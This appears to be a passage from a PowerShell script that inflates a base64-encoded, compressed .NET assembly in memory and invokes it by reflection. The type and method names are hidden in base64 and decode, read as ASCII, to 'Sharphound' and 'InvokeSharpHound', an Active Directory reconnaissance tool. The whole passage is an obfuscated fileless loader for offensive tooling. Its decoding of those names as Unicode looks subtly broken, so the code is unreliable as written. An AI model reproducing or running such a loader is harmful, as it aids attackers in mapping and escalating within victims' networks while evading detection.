    $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
	$UncompressedFileBytes = New-Object Byte[](1046528)
	$DeflatedStream.Read($UncompressedFileBytes, 0, 1046528) | Out-Null
	$Assembly = [Reflection.Assembly]::Load($UncompressedFileBytes)
	$BindingFlags = [Reflection.BindingFlags] "Public,Static"
	$a = @()
    $v1 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("U2hhcnBob3VuZA=="))
    $v2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SW52b2tlU2hhcnBIb3VuZA=="))
	$Assembly.GetType("Costura.AssemblyLoader", $false).GetMethod("Attach", $BindingFlags).Invoke($Null, @())
	$Assembly.GetType($v1).GetMethod($v2).Invoke($Null, @(,$passed))
}
